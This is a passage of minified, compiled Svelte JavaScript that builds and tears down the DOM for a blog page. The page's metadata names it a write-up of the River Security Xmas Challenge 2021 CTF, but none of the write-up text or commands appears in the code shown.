,Rl),n(Rl,O1),n(X,F1),l(a,Eu,p),l(a,Sn,p),Sn.innerHTML=YT,l(a,Tu,p),l(a,W,p),n(W,z1),n(W,Ul),n(Ul,C1),n(W,D1),n(W,Nl),n(Nl,Y1),n(W,Z1),n(W,Wl),n(Wl,J1),n(W,j1),l(a,yu,p),l(a,Mn,p),Mn.innerHTML=ZT,l(a,Vu,p),l(a,To,p),n(To,P1),l(a,xu,p),l(a,In,p),In.innerHTML=JT,l(a,Ru,p),l(a,On,p),n(On,H1),n(On,Sl),n(Sl,A1),l(a,Uu,p),l(a,Fn,p),n(Fn,yo),n(yo,X1),l(a,Nu,p),l(a,zn,p),n(zn,Vo),n(Vo,q1),l(a,Wu,p),l(a,xo,p),n(xo,Ro),n(Ro,G1),n(Ro,_a),n(_a,B1),l(a,Su,p),l(a,Cn,p),n(Cn,Uo),n(Uo,$1),l(a,Mu,p),l(a,m,p),n(m,Q1),n(m,Ml),n(Ml,L1),n(m,K1),n(m,Il),n(Il,a2),n(m,s2),n(m,Ol),n(Ol,n2),n(m,e2),n(m,Fl),n(Fl,t2),n(m,o2),n(m,zl),n(zl,p2),n(m,l2),n(m,Cl),n(Cl,i2),n(m,c2),n(m,Dl),n(Dl,r2),n(m,u2),n(m,Yl),n(Yl,k2),n(m,h2),l(a,Iu,p),l(a,Dn,p),Dn.innerHTML=jT,l(a,Ou,p),l(a,S,p),n(S,f2),n(S,Zl),n(Zl,d2),n(S,m2),n(S,Jl),n(Jl,b2),n(S,g2),n(S,jl),n(jl,v2),n(S,_2),l(a,Fu,p),l(a,Yn,p),Yn.innerHTML=PT,l(a,zu,p),l(a,Zn,p),Zn.innerHTML=HT,l(a,Cu,p),l(a,Jn,p),n(Jn,w2),n(Jn,Pl),n(Pl,E2),l(a,Du,p),l(a,jn,p),n(jn,No),n(No,T2),l(a,Yu,p),l(a,Pn,p),n(Pn,Wo),n(Wo,y2),l(a,Zu,p),l(a,So,p),n(So,Mo),n(Mo,V2),n(Mo,wa),n(wa,x2),l(a,Ju,p),l(a,Hn,p),n(Hn,Io),n(Io,R2),l(a,ju,p),l(a,Za,p),n(Za,U2),n(Za,Hl),n(Hl,N2),n(Za,W2),l(a,Pu,p),l(a,An,p),An.innerHTML=AT,l(a,Hu,p),l(a,Xn,p),n(Xn,S2),n(Xn,Al),n(Al,M2),l(a,Au,p),l(a,qn,p),n(qn,Oo),n(Oo,I2),l(a,Xu,p),l(a,Gn,p),n(Gn,Fo),n(Fo,O2),l(a,qu,p),l(a,zo,p),n(zo,Co),n(Co,F2),n(Co,Ea),n(Ea,z2),l(a,Gu,p),l(a,Bn,p),n(Bn,Do),n(Do,C2),l(a,Bu,p),l(a,g,p),n(g,D2),n(g,Xl),n(Xl,Y2),n(g,Z2),n(g,ql),n(ql,J2),n(g,j2),n(g,Gl),n(Gl,P2),n(g,H2),n(g,Bl),n(Bl,A2),n(g,X2),n(g,$l),n($l,q2),n(g,G2),n(g,Ql),n(Ql,B2),n(g,$2),l(a,$u,p),l(a,E,p),n(E,Q2),n(E,Ll),n(Ll,L2),n(E,K2),n(E,Kl),n(Kl,ab),n(E,sb),n(E,ai),n(ai,nb),n(E,eb),n(E,si),n(si,tb),n(E,ob),n(E,ni),n(ni,pb),n(E,lb),l(a,Qu,p),l(a,$n,p),$n.innerHTML=XT,l(a,Lu,p),l(a,q,p),n(q,ib),n(q,ei),n(ei,cb),n(q,rb),n(q,ti),n(ti,ub),n(q,kb),l(a,Ku,p),l(a,Qn,p),Qn.innerHTML=qT,l(a,ak,p),l(a,Ln,p),n(Ln,hb),n(Ln,oi),n(oi,fb),l(a,sk,p),l(a,Kn,p),n(Kn,Yo),n(Yo,db),l(a,nk,p),l(a,ae,p),n(ae,Zo),n(Zo,mb),l(a,ek,p),l(a,Jo,p),n(Jo,jo),n(jo,bb),n(jo,Ta),n(Ta,gb),l(a,tk,p),l(a,se,p),n(se,Po),n(Po,vb),l(a,ok,p),l(a,Ho,p),n(Ho,_b),l(a,pk,p),l(a,ne,p),ne.innerHTML=GT,l(a,lk,p),l(a,T,p),n(T,wb),n(T,pi),n(pi,Eb),n(T,Tb),n(T,li),n(li,yb),n(T,Vb),n(T,ii),n(ii,xb),n(T,Rb),n(T,ci),n(ci,Ub),n(T,Nb),n(T,ri),n(ri,Wb),n(T,Sb),l(a,ik,p),l(a,ee,p),ee.innerHTML=BT,l(a,ck,p),l(a,te,p),n(te,Mb),n(te,ui),n(ui,Ib),l(a,rk,p),l(a,oe,p),n(oe,Ao),n(Ao,Ob),l(a,uk,p),l(a,pe,p),n(pe,Xo),n(Xo,Fb),l(a,kk,p),l(a,qo,p),n(qo,Go),n(Go,zb),n(Go,ya),n(ya,Cb),l(a,hk,p),l(a,le,p),n(le,Bo),n(Bo,Db),l(a,fk,p),l(a,G,p),n(G,Yb),n(G,ki),n(ki,Zb),n(G,Jb),n(G,hi),n(hi,jb),n(G,Pb),l(a,dk,p),l(a,ie,p),ie.innerHTML=$T,l(a,mk,p),l(a,y,p),n(y,Hb),n(y,fi),n(fi,Ab),n(y,Xb),n(y,di),n(di,qb),n(y,Gb),n(y,mi),n(mi,Bb),n(y,$b),n(y,bi),n(bi,Qb),n(y,Lb),n(y,gi),n(gi,Kb),n(y,a0),l(a,bk,p),l(a,ce,p),ce.innerHTML=QT,l(a,gk,p),l(a,re,p),n(re,s0),n(re,vi),n(vi,n0),l(a,vk,p),l(a,ue,p),n(ue,$o),n($o,e0),l(a,_k,p),l(a,ke,p),n(ke,Qo),n(Qo,t0),l(a,wk,p),l(a,Lo,p),n(Lo,_i),n(_i,o0),l(a,Ek,p),l(a,he,p),n(he,Ko),n(Ko,p0),l(a,Tk,p),l(a,v,p),n(v,l0),n(v,wi),n(wi,i0),n(v,c0),n(v,Ei),n(Ei,r0),n(v,u0),n(v,Ti),n(Ti,k0),n(v,h0),n(v,yi),n(yi,f0),n(v,d0),n(v,Vi),n(Vi,m0),n(v,b0),n(v,xi),n(xi,g0),n(v,v0),l(a,yk,p),l(a,Ja,p),n(Ja,_0),n(Ja,Ri),n(Ri,w0),n(Ja,E0),l(a,Vk,p),l(a,fe,p),fe.innerHTML=LT,l(a,xk,p),l(a,ap,p),n(ap,T0),l(a,Rk,p),l(a,de,p),de.innerHTML=KT,l(a,Uk,p),l(a,ja,p),n(ja,y0),n(ja,Ui),n(Ui,V0),n(ja,x0),l(a,Nk,p),l(a,D,p),n(D,R0),n(D,Ni),n(Ni,U0),n(D,N0),n(D,sp),n(D,W0),n(D,np),l(a,Wk,p),l(a,me,p),n(me,S0),n(me,ep),l(a,Sk,p),l(a,be,p),n(be,M0),n(be,Wi),n(Wi,I0),l(a,Mk,p),l(a,ge,p),n(ge,tp),n(tp,O0),l(a,Ik,p),l(a,ve,p),n(ve,op),n(op,F0),l(a,Ok,p),l(a,pp,p),n(pp,lp),n(lp,z0),n(lp,Va),n(Va,C0),l(a,Fk,p),l(a,_e,p),n(_e,ip),n(ip,D0),l(a,zk,p),l(a,B,p),n(B,Y0),n(B,Si),n(Si,Z0),n(B,J0),n(B,Mi),n(Mi,j0),n(B,P0),l(a,Ck,p),l(a,$,p),n($,H0),n($,Ii),n(Ii,A0),n($,X0),n($,Oi),n(Oi,q0),n($,G0),l(a,Dk,p),l(a,we,p),we.innerHTML=ay,l(a,Yk,p),l(a,Pa,p),n(Pa,B0),n(Pa,Fi),n(Fi,$0),n(Pa,Q0),l(a,Zk,p),l(a,Ee,p),Ee.innerHTML=sy,l(a,Jk,p),l(a,Te,p),n(Te,L0),n(Te,zi),n(zi,K0),l(a,jk,p),l(a,ye,p),n(ye,cp),n(cp,ag),l(a,Pk,p),l(a,Ve,p),n(Ve,rp),n(rp,sg),l(a,Hk,p),l(a,up,p),n(up,kp),n(kp,ng),n(kp,xa),n(xa,eg),l(a,Ak,p),l(a,xe,p),n(xe,hp),n(hp,tg),l(a,Xk,p),l(a,_,p),n(_,og),n(_,Ci),n(Ci,pg),n(_,lg),n(_,Di),n(Di,ig),n(_,cg),n(_,Yi),n(Yi,rg),n(_,ug),n(_,Zi),n(Zi,kg),n(_,hg),n(_,Ji),n(Ji,fg),n(_,dg),n(_,ji),n(ji,mg),n(_,bg),l(a,qk,p),l(a,fp,p),n(fp,Pi),n(Pi,gg),l(a,Gk,p),l(a,Ha,p),n(Ha,vg),n(Ha,Ra),n(Ra,_g),n(Ha,wg),l(a,Bk,p),l(a,Re,p),Re.innerHTML=ny,l(a,$k,p),l(a,Ue,p),Ue.innerHTML=ey,l(a,Qk,p),l(a,dp,p),n(dp,Eg),l(a,Lk,p),l(a,mp,p),n(mp,Tg),l(a,Kk,p),l(a,Y,p),n(Y,Ne),n(Ne,yg),n(Ne,Hi),n(Hi,Vg),n(Ne,xg),n(Y,Rg),n(Y,Ai),n(Ai,Ug),n(Y,Ng),n(Y,Xi),n(Xi,Wg),l(a,ah,p),l(a,Q,p),n(Q,Sg),n(Q,qi),n(qi,Mg),n(Q,Ig),n(Q,Gi),n(Gi,Og),n(Q,Fg),l(a,sh,p),l(a,We,p),We.innerHTML=ty,l(a,nh,p),l(a,Aa,p),n(Aa,zg),n(Aa,Ua),n(Ua,Cg),n(Aa,Dg),l(a,eh,p),l(a,Se,p),Se.innerHTML=oy,l(a,th,p),l(a,bp,p),n(bp,Yg),l(a,oh,p),l(a,Me,p),Me.innerHTML=py,l(a,ph,p),l(a,Ie,p),Ie.innerHTML=ly,l(a,lh,p),l(a,Xa,p),n(Xa,Zg),n(Xa,Bi),n(Bi,Jg),n(Xa,jg),l(a,ih,p),l(a,Oe,p),Oe.innerHTML=iy,l(a,ch,p),l(a,gp,p),n(gp,Pg),l(a,rh,p),l(a,Fe,p),Fe.innerHTML=cy,l(a,uh,p),l(a,qa,p),n(qa,Hg),n(qa,$i),n($i,Ag),n(qa,Xg),l(a,kh,p),l(a,ze,p),ze.innerHTML=ry,l(a,hh,p),l(a,Ce,p),n(Ce,qg),n(Ce,Qi),n(Qi,Gg)},p:b4,d(a){a&&s(f),a&&s(J),a&&s(F),a&&s($a),a&&s(Qa),a&&s(ac),a&&s(Wa),a&&s(sc),a&&s(Ka),a&&s(nc),a&&s(He),a&&s(ec),a&&s(as),a&&s(tc),a&&s(ss),a&&s(oc),a&&s(ns),a&&s(pc),a&&s(es),a&&s(lc),a&&s(Sa),a&&s(ic),a&&s(ts),a&&s(cc),a&&s(j),a&&s(rc),a&&s(os),a&&s(uc),a&&s(Ge),a&&s(kc),a&&s(ps),a&&s(hc),a&&s(ls),a&&s(fc),a&&s(is),a&&s(dc),a&&s(cs),a&&s(mc),a&&s(Qe),a&&s(bc),a&&s(rs),a&&s(gc),a&&s(us),a&&s(vc),a&&s(ks),a&&s(_c),a&&s(Ma),a&&s(wc),a&&s(hs),a&&s(Ec),a&&s(fs),a&&s(Tc),a&&s(nt),a&&s(yc),a&&s(ds),a&&s(Vc),a&&s(Ia),a&&s(xc),a&&s(ms),a&&s(Rc),a&&s(bs),a&&s(Uc),a&&s(gs),a&&s(Nc),a&&s(vs),a&&s(Wc),a&&s(lt),a&&s(Sc),a&&s(_s),a&&s(Mc),a&&s(rt),a&&s(Ic),a&&s(ws),a&&s(Oc),a&&s(Oa),a&&s(Fc),a&&s(Es),a&&s(zc),a&&s(ut),a&&s(Cc),a&&s(Ts),a&&s(Dc),a&&s(ys),a&&s(Yc),a&&s(Vs),a&&s(Zc),a&&s(xs),a&&s(Jc),a&&s(ft),a&&s(jc),a&&s(Rs),a&&s(Pc),a&&s(N),a&&s(Hc),a&&s(Us),a&&s(Ac),a&&s(Ns),a&&s(Xc),a&&s(Ws),a&&s(qc),a&&s(_t),a&&s(Gc),a&&s(Ss),a&&s(Bc),a&&s(Tt),a&&s($c),a&&s(Ms),a&&s(Qc),a&&s(pa),a&&s(Lc),a&&s(Is),a&&s(Kc),a&&s(Os),a&&s(ar),a&&s(Fs),a&&s(sr),a&&s(Rt),a&&s(nr),a&&s(zs),a&&s(er),a&&s(V),a&&s(tr),a&&s(Cs),a&&s(or),a&&s(Ds),a&&s(pr),a&&s(Ys),a&&s(lr),a&&s(Mt),a&&s(ir),a&&s(Zs),a&&s(cr),a&&s(C),a&&s(rr),a&&s(zt),a&&s(ur),a&&s(Js),a&&s(kr),a&&s(P),a&&s(hr),a&&s(js),a&&s(fr),a&&s(Ps),a&&s(dr),a&&s(Hs),a&&s(mr),a&&s(As),a&&s(br),a&&s(Yt),a&&s(gr),a&&s(Xs),a&&s(vr),a&&s(H),a&&s(_r),a&&s(qs),a&&s(wr),a&&s(Gs),a&&s(Er),a&&s(Bs),a&&s(Tr),a&&s($s),a&&s(yr),a&&s(Ht),a&&s(Vr),a&&s(Qs),a&&s(xr),a&&s(Fa),a&&s(Rr),a&&s(A),a&&s(Ur),a&&s(Ls),a&&s(Nr),a&&s(Ks),a&&s(Wr),a&&s(an),a&&s(Sr),a&&s(sn),a&&s(Mr),a&&s(Bt),a&&s(Ir),a&&s(nn),a&&s(Or),a&&s(Qt),a&&s(Fr),a&&s(en),a&&s(zr),a&&s(tn),a&&s(Cr),a&&s(on),a&&s(Dr),a&&s(pn),a&&s(Yr),a&&s(ao),a&&s(Zr),a&&s(ln),a&&s(Jr),a&&s(za),a&&s(jr),a&&s(cn),a&&s(Pr),a&&s(eo),a&&s(Hr),a&&s(rn),a&&s(Ar),a&&s(un),a&&s(Xr),a&&s(kn),a&&s(qr),a&&s(hn),a&&s(Gr),a&&s(po),a&&s(Br),a&&s(fn),a&&s($r),a&&s(da),a&&s(Qr),a&&s(ro),a&&s(Lr),a&&s(dn),a&&s(Kr),a&&s(mn),a&&s(au),a&&s(bn),a&&s(su),a&&s(gn),a&&s(nu),a&&s(ho),a&&s(eu),a&&s(vn),a&&s(tu),a&&s(h),a&&s(ou),a&&s(_n),a&&s(pu),a&&s(wn),a&&s(lu),a&&s(En),a&&s(iu),a&&s(Tn),a&&s(cu),a&&s(yn),a&&s(ru),a&&s(vo),a&&s(uu),a&&s(Vn),a&&s(ku),a&&s(Ca),a&&s(hu),a&&s(xn),a&&s(fu),a&&s(Rn),a&&s(du),a&&s(Da),a&&s(mu),a&&s(Un),a&&s(bu),a&&s(Ya),a&&s(gu),a&&s(Nn),a&&s(vu),a&&s(Eo),a&&s(_u),a&&s(Wn),a&&s(wu),a&&s(X),a&&s(Eu),a&&s(Sn),a&&s(Tu),a&&s(W),a&&s(yu),a&&s(Mn),a&&s(Vu),a&&s(To),a&&s(xu),a&&s(In),a&&s(Ru),a&&s(On),a&&s(Uu),a&&s(Fn),a&&s(Nu),a&&s(zn),a&&s(Wu),a&&s(xo),a&&s(Su),a&&s(Cn),a&&s(Mu),a&&s(m),a&&s(Iu),a&&s(Dn),a&&s(Ou),a&&s(S),a&&s(Fu),a&&s(Yn),a&&s(zu),a&&s(Zn),a&&s(Cu),a&&s(Jn),a&&s(Du),a&&s(jn),a&&s(Yu),a&&s(Pn),a&&s(Zu),a&&s(So),a&&s(Ju),a&&s(Hn),a&&s(ju),a&&s(Za),a&&s(Pu),a&&s(An),a&&s(Hu),a&&s(Xn),a&&s(Au),a&&s(qn),a&&s(Xu),a&&s(Gn),a&&s(qu),a&&s(zo),a&&s(Gu),a&&s(Bn),a&&s(Bu),a&&s(g),a&&s($u),a&&s(E),a&&s(Qu),a&&s($n),a&&s(Lu),a&&s(q),a&&s(Ku),a&&s(Qn),a&&s(ak),a&&s(Ln),a&&s(sk),a&&s(Kn),a&&s(nk),a&&s(ae),a&&s(ek),a&&s(Jo),a&&s(tk),a&&s(se),a&&s(ok),a&&s(Ho),a&&s(pk),a&&s(ne),a&&s(lk),a&&s(T),a&&s(ik),a&&s(ee),a&&s(ck),a&&s(te),a&&s(rk),a&&s(oe),a&&s(uk),a&&s(pe),a&&s(kk),a&&s(qo),a&&s(hk),a&&s(le),a&&s(fk),a&&s(G),a&&s(dk),a&&s(ie),a&&s(mk),a&&s(y),a&&s(bk),a&&s(ce),a&&s(gk),a&&s(re),a&&s(vk),a&&s(ue),a&&s(_k),a&&s(ke),a&&s(wk),a&&s(Lo),a&&s(Ek),a&&s(he),a&&s(Tk),a&&s(v),a&&s(yk),a&&s(Ja),a&&s(Vk),a&&s(fe),a&&s(xk),a&&s(ap),a&&s(Rk),a&&s(de),a&&s(Uk),a&&s(ja),a&&s(Nk),a&&s(D),a&&s(Wk),a&&s(me),a&&s(Sk),a&&s(be),a&&s(Mk),a&&s(ge),a&&s(Ik),a&&s(ve),a&&s(Ok),a&&s(pp),a&&s(Fk),a&&s(_e),a&&s(zk),a&&s(B),a&&s(Ck),a&&s($),a&&s(Dk),a&&s(we),a&&s(Yk),a&&s(Pa),a&&s(Zk),a&&s(Ee),a&&s(Jk),a&&s(Te),a&&s(jk),a&&s(ye),a&&s(Pk),a&&s(Ve),a&&s(Hk),a&&s(up),a&&s(Ak),a&&s(xe),a&&s(Xk),a&&s(_),a&&s(qk),a&&s(fp),a&&s(Gk),a&&s(Ha),a&&s(Bk),a&&s(Re),a&&s($k),a&&s(Ue),a&&s(Qk),a&&s(dp),a&&s(Lk),a&&s(mp),a&&s(Kk),a&&s(Y),a&&s(ah),a&&s(Q),a&&s(sh),a&&s(We),a&&s(nh),a&&s(Aa),a&&s(eh),a&&s(Se),a&&s(th),a&&s(bp),a&&s(oh),a&&s(Me),a&&s(ph),a&&s(Ie),a&&s(lh),a&&s(Xa),a&&s(ih),a&&s(Oe),a&&s(ch),a&&s(gp),a&&s(rh),a&&s(Fe),a&&s(uh),a&&s(qa),a&&s(kh),a&&s(ze),a&&s(hh),a&&s(Ce)}}}function _4(Je){let f,Z;const J=[Je[0],fT];let F={$$slots:{default:[v4]},$$scope:{ctx:Je}};for(let d=0;d<J.length;d+=1)F=Z3(F,J[d]);return f=new g4({props:F}),{c(){r4(f.$$.fragment)},l(d){u4(f.$$.fragment,d)},m(d,z){k4(f,d,z),Z=!0},p(d,[z]){const $a=z&1?h4(J,[z&1&&kT(d[0]),z&0&&kT(fT)]):{};z&2&&($a.$$scope={dirty:z,ctx:d}),f.$set($a)},i(d){Z||(f4(f.$$.fragment,d),Z=!0)},o(d){d4(f.$$.fragment,d),Z=!1},d(d){m4(f,d)}}}const fT={title:"River Security Xmas Challenge (RSXC2021)",date:"2021-12-26",category:"writeup",tags:["rsxc","ctf"]};function w4(Je,f,Z){return Je.$$set=J=>{Z(0,f=Z3(Z3({},f),hT(J)))},f=hT(f),[f]}class V4 extends l4{constructor(f){super(),i4(this,f,w4,_4,c4,{})}}export{V4 as default,fT as metadata};
